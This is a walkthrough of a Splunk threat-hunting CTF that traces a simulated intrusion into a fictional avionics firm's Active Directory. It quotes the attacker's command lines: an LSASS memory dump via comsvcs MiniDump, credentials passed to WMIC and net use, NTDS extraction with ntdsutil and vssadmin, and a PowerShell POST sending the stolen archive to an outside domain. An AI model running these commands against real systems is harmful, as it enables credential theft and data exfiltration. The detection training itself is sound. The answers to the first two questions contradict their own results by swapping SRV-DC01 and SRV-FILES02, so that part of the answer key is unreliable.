# Splunk Enterprise Threat Hunting Challenge — Investigation Walkthrough

## Active Directory Compromise Investigation | Capture the Flag (CTF) 8

## Scenario Briefing

On Friday, March 6th 2026 at 08:50, an administrator named **Markus Richter** reported that the Security event log on the domain controller was basically empty, with an entry showing it had been cleared under his account. He denied performing the action, indicating possible credential compromise.

As the Tier 1 SOC analyst on the morning shift for **Haldric Aerospace**, a mid-size avionics contractor, the objective was to identify what happened, when it first occurred, and what steps would reduce the risk of recurrence.

**Index:** `mydfir-ctf8`
**Timeframe:** Feb 16 00:00 to Mar 7 23:59

---

## 1. Under His Name

**Question:** On the domain controller, find the event recording that the Security audit log was cleared. Which account cleared it?
**Format:** username

```spl
index=mydfir-ctf8 EventCode=1102 | sort +_time
```

**Result (excerpt):**
| Field | Value |
|---|---|
| ComputerName | SRV-FILES02.haldric.local |
| EventCode | 1102 |
| TaskCategory | Log clear |
| Message | The audit log was cleared. |
| Account Name | m.richter |
| Domain Name | HALDRIC |
| Logon ID | 0x90FCCA |

<img width="642" height="357" alt="image" src="https://github.com/user-attachments/assets/8abeb301-5b8f-4733-b892-1290deead227" />

**✅ Answer:** `m.richter`

---

## 2. Twice in One Night

**Question:** The same account cleared the Security log on a second server. Which server was it?
**Format:** hostname

**Result:** A second `EventCode=1102` clear event was found on `SRV-DC01.haldric.local`, also under Account Name `m.richter` (Logon ID `0x10E8AAA`).

<img width="677" height="751" alt="image" src="https://github.com/user-attachments/assets/c7d6bb1b-50bd-41df-914c-2dd5ba1d0658" />

**✅ Answer:** `SRV-FILES02`

---

## 3. Where the Hands Were

**Question:** Find the Event 4648 logons where m.richter's creds were used AGAINST the servers. What SOURCE host did that activity originate FROM?
**Format:** hostname

```spl
index=mydfir-ctf8 EventCode=4648 Account_Name="m.richter" | sort +_time
```

**Result:** Repeated `EventCode=4648` events with `ComputerName=WS-ENG04.haldric.local`.

<img width="671" height="856" alt="image" src="https://github.com/user-attachments/assets/5252ef9d-ea77-4728-ad66-dcb0758d3967" />

**✅ Answer:** `WS-ENG04`

---

## 4. Built-In Betrayal

**Question:** What command-line tool on WS-ENG04 executed those remote commands on the servers using m.richter's credentials?
**Format:** tool name

**Result (Event 4648 detail):**
| Field | Value |
|---|---|
| Account Name (initiator) | s.brandt |
| Account Whose Credentials Were Used | m.richter |
| Target Server Name | SRV-DC01.haldric.local |
| Process Name | `C:\Windows\System32\WMIC.exe` |

<img width="687" height="647" alt="image" src="https://github.com/user-attachments/assets/10d4433f-2cdd-43d0-a7e5-f2e6ec268e75" />

**✅ Answer:** `WMIC`

---

## 5. Plaintext on the Line

**Question:** What is m.richter's plaintext password, visible in the process arguments?
**Format:** string

```spl
index=mydfir-ctf8 EventCode=4648 OR EventCode=4624 OR EventCode=4625 OR EventCode=4688 OR EventCode=1 password | table _time EventCode user process_command_line process_command_line_arguments | sort +_time
```

**Result (excerpt):** `wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process list brief`

<img width="1822" height="435" alt="image" src="https://github.com/user-attachments/assets/fbb5cf20-d040-4c1f-af4c-f0006e5ad264" />

**✅ Answer:** `Haldric2025SecIT`

---

## 6. Memory Heist

**Question:** What did the attacker execute to dump credentials on WS-ENG04?
**Format:** full command line

```spl
index=mydfir-ctf8 host="WS-ENG04" lsass | sort +_time
```

**Analysis:** A Windows `tasklist` command filtering for the LSASS process was run first (`tasklist /fi "imagename eq lsass.exe"`), followed by the credential dump itself.

**Result:** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full`

**MITRE ATT&CK:** T1003.001 – OS Credential Dumping: LSASS Memory; possibly T1218.011 – System Binary Proxy Execution: Rundll32

<img width="987" height="705" alt="image" src="https://github.com/user-attachments/assets/0892ea64-28b5-4487-8e48-d6f177888ce5" />

**✅ Answer:** `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full`

---

## 7. Target Acquired

**Question:** What PID did the MiniDump command dump?
**Format:** integer

<img width="987" height="705" alt="image" src="https://github.com/user-attachments/assets/8ce07721-b52d-4301-9e75-985325fd4892" />

**✅ Answer:** `628`

---

## 8. Where It Landed

**Question:** Where on disk was the credential dump written?
**Format:** file path

<img width="1020" height="200" alt="image" src="https://github.com/user-attachments/assets/0c9e163a-73df-4bc6-a7da-ff000d38c4a6" />

**✅ Answer:** `C:\Windows\Temp\sys_diag.dmp`

---

## 9. Which Account

**Question:** Per the process-creation events, which user account executed the attacker's commands on WS-ENG04?
**Format:** username

**Result (Event 4688 Creator Subject):** Account Name = `s.brandt`

<img width="991" height="741" alt="image" src="https://github.com/user-attachments/assets/310da6a5-df3f-4af0-84f7-e05a15156edd" />

**✅ Answer:** `s.brandt`

---

## 10. The Master Discriminator

**Question:** In the VPN logs, what internal tunnel IP is assigned to the attacker's s.brandt sessions?
**Format:** IPv4

```spl
index=mydfir-ctf8 user="s.brandt" source="/var/log/fortigate/vpn.log" user="s.brandt" | table host, group, remip, tunnelip
```

**Result:** Multiple sessions under group `Engineering-VPN` from `remip=45.153.168.88` map to `tunnelip=10.1.96.114`.

<img width="1827" height="730" alt="image" src="https://github.com/user-attachments/assets/2ac72525-c376-4a8f-b267-dbc2d6050602" />

**✅ Answer:** `10.1.96.114`

---

## 11. First Way In

**Question:** What was the SOURCE (external) IP of the FIRST successful unauthorised VPN login as s.brandt?
**Format:** IPv4

**Result:** Reviewing the VPN log timeline, `remip=185.220.101.34` appears as the first successful (`ssl-login-succ`) session tied to `tunnelip=10.1.96.114`.

<img width="1707" height="636" alt="image" src="https://github.com/user-attachments/assets/75b506f4-dd0b-4ab4-9cb8-e1161a7696d9" />

**✅ Answer:** `185.220.101.34`

---

## 12. Timeline Entry #1

**Question:** What is the timestamp (UTC) of the attacker's first footprint in the entire dataset?
**Format:** YYYY-MM-DD HH:MM:SS

```spl
index=mydfir-ctf8 185.220.101.34 | sort +_time
```

**Result:** First event — `action="ssl-login-fail" reason="ssl_vpn_login_invalid_credential"` from `remip=185.220.101.34`, `user="s.brandt"`.

<img width="1600" height="560" alt="image" src="https://github.com/user-attachments/assets/7267e039-3a26-4c77-82f4-ea1e1acc186f" />

**✅ Answer:** `2026-02-19 23:47:12`

---

## 13. Rotating Doors

**Question:** How many DISTINCT external source IPs did the attacker log in from across the whole intrusion?
**Format:** integer

```spl
index=mydfir-ctf8 10.1.96.114 | dedup remip | table remip, tunnelip
```

**Result:** `185.220.101.34`, `45.153.168.88`, `91.234.33.126` — all mapped to `tunnelip=10.1.96.114`.

<img width="1855" height="145" alt="image" src="https://github.com/user-attachments/assets/9605e34d-696b-4a3a-8faa-fd395da893be" />

**✅ Answer:** `3`

---

## 14. The One You Don't Flag

**Question:** What is s.brandt's LEGITIMATE residential source IP?
**Format:** IPv4

```spl
index=mydfir-ctf8 "s.brandt" remip=*
| stats count earliest(_time) as first_seen latest(_time) as last_seen values(tunnelip) as tunnel_ip by remip
| convert ctime(first_seen) ctime(last_seen)
| sort - count
```

**Result:** `remip=88.153.72.14` had by far the highest count (87 events) spanning the full date range, versus the much smaller counts for the three attacker IPs — indicating this is the legitimate, recurring source.

<img width="1833" height="162" alt="image" src="https://github.com/user-attachments/assets/e583d767-81c0-4fb4-941d-5288bdf8e4e4" />

**✅ Answer:** `88.153.72.14`

---

## 15. Getting Oriented

**Question:** Back on WS-ENG04, what was the FIRST host-recon command the attacker ran after gaining the foothold?
**Format:** command

```spl
index=mydfir-ctf8 WS-ENG04 | table _time, Process_Command_Line | sort +_time
```

**Result:** `systeminfo` (02/20/2026 02:14:30)

<img width="801" height="517" alt="image" src="https://github.com/user-attachments/assets/7e1a3175-ef45-47a6-bd40-31b6af8263c8" />

**✅ Answer:** `systeminfo`

---

## 16. Hunting for Power

**Question:** Which two privileged AD groups did the attacker enumerate?
**Format:** Group1, Group2

```spl
index=mydfir-ctf8 host="WS-ENG04" net Process_Command_Line!="*C:\\Program Files\\SplunkUniversalForwarder\\*" | table _time, Process_Command_Line | sort +_time
```

**Result:** `net group "Domain Admins" /dom`, `net group "Enterprise Admins" /dom`

<img width="1337" height="436" alt="image" src="https://github.com/user-attachments/assets/4519e383-30df-4103-a68a-6ab9ca11f27f" />

**✅ Answer:** `Domain Admins, Enterprise Admins`

---

## 17. The First Door

**Question:** Using m.richter's creds, what was the FIRST server the attacker authenticated to over its C$ admin share?
**Format:** hostname

**Result:** `net use \\SRV-DC01\C$ /user:m.richter Haldric2025SecIT`

<img width="1275" height="442" alt="image" src="https://github.com/user-attachments/assets/a1736fd1-630d-4b8f-919e-f6eed93f74e9" />

**✅ Answer:** `SRV-DC01`

---

## 18. The Crown Jewels

**Question:** What utility did the attacker use to extract the Active Directory database?
**Format:** tool name

```spl
index=mydfir-ctf8 ntds Process_Command_Line!="*C:\\Program Files\\SplunkUniversalForwarder\\*" | table _time, Process_Command_Line | sort +_time
```

**Result:** `wmic /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create "cmd.exe /c mkdir C:\Windows\Temp\McAfee_Logs & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\McAfee_Logs\""` followed by `ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs" q q`

<img width="1641" height="170" alt="image" src="https://github.com/user-attachments/assets/8269174b-1e79-4f15-8f31-62aa15238d6d" />

**✅ Answer:** `ntdsutil`

---

## 19. A Vendor That Isn't There

**Question:** The NTDS extract were written into a masquerade folder. What was that folder path?
**Format:** path

<img width="1597" height="122" alt="image" src="https://github.com/user-attachments/assets/07fa426f-eb75-4b0d-9892-6ba8eaa01373" />

**✅ Answer:** `C:\Windows\Temp\McAfee_Logs\`

---

## 20. Shadow Play

**Question:** What command created a volume shadow copy on the DC to support the database extraction?
**Format:** command

```spl
index=mydfir-ctf8 host="SRV-DC01" Process_Command_Line!="*C:\\Program Files\\SplunkUniversalForwarder\\*" shadow | table _time, Process_Command_Line | sort +_time
```

<img width="1055" height="77" alt="image" src="https://github.com/user-attachments/assets/6fb7be8a-9681-43c6-aaa6-8456fdec443d" />

**✅ Answer:** `vssadmin create shadow /for=C:`

---

## 21. Following the Data

**Question:** The attacker pivoted to a SECOND server over with m.richter's creds. Which host?
**Format:** hostname

**Result:** `net use \\SRV-FILES02\C$ /user:m.richter Haldric2025SecIT`

<img width="1307" height="446" alt="image" src="https://github.com/user-attachments/assets/c864c3a4-c501-4b83-bc32-033b521d2ea1" />

**✅ Answer:** `SRV-FILES02`

---

## 22. What They Came For

**Question:** On SRV-FILES02, what sensitive directory did the attacker archive for theft?
**Format:** path

```spl
index=mydfir-ctf8 host="SRV-FILES02" Process_Command_Line!="*C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\*" zip | table _time, Process_Command_Line | sort +_time
```

**Result:** `powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force`

<img width="1217" height="140" alt="image" src="https://github.com/user-attachments/assets/ebd3c668-c144-4594-a70d-dfd135f96d17" />

**✅ Answer:** `C:\Engineering\Avionics\A400M_NavSys\*`

---

## 23. Patch Notes

**Question:** What was the staged archive filename the attacker created?
**Format:** filename

<img width="1222" height="131" alt="image" src="https://github.com/user-attachments/assets/d9bb36ec-170a-4edb-8a7b-0f59203aec6b" />

**✅ Answer:** `win_update_kb5034.zip`

---

## 24. The Channel Out

**Question:** What external domain did the attacker POST the encoded archive to?
**Format:** domain

```spl
index=mydfir-ctf8 host="WS-ENG04" POST Process_Command_Line!="*C:\\Program Files\\SplunkUniversalForwarder\\*" | table _time, host, Process_Command_Line | sort +_time
```

**Result:** `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`

<img width="1382" height="75" alt="image" src="https://github.com/user-attachments/assets/5b53a2a3-ef43-4509-a621-0daeac27550f" />

**✅ Answer:** `cdn-telemetry.cloud-endpoint.net`

---

## Attack Narrative (Reconstructed Timeline)

1. **2026-02-19 23:47:12** — First attacker footprint: failed VPN login attempt as `s.brandt` from `185.220.101.34` (invalid credentials).
2. **2026-02-20** — Attacker successfully authenticates to the VPN as `s.brandt`, establishing a tunnel to `10.1.96.114`, landing on `WS-ENG04`. Runs `systeminfo` for host reconnaissance.
3. **2026-02-23** — Enumerates privileged AD groups (`Domain Admins`, `Enterprise Admins`) from WS-ENG04.
4. **2026-02-26** — Dumps LSASS memory via `rundll32.exe`/`comsvcs.dll` (PID 628) to `C:\Windows\Temp\sys_diag.dmp`, harvesting `m.richter`'s plaintext credentials (`Haldric2025SecIT`) via WMIC.
5. **2026-02-28 (~03:14–03:22)** — Uses `m.richter`'s credentials to authenticate to `SRV-DC01` and `SRV-FILES02` via C$ admin shares; extracts the NTDS database with `ntdsutil` (supported by a `vssadmin` volume shadow copy) into a masquerade folder (`C:\Windows\Temp\McAfee_Logs\`); clears the Security event logs on both servers.
6. **2026-02-28 (~03:18–03:25)** — On `SRV-FILES02`, archives the sensitive `C:\Engineering\Avionics\A400M_NavSys\` directory into `win_update_kb5034.zip`.
7. **2026-03-02** — Base64-encodes the archive and exfiltrates it via an HTTP POST from `WS-ENG04` to `cdn-telemetry.cloud-endpoint.net`.
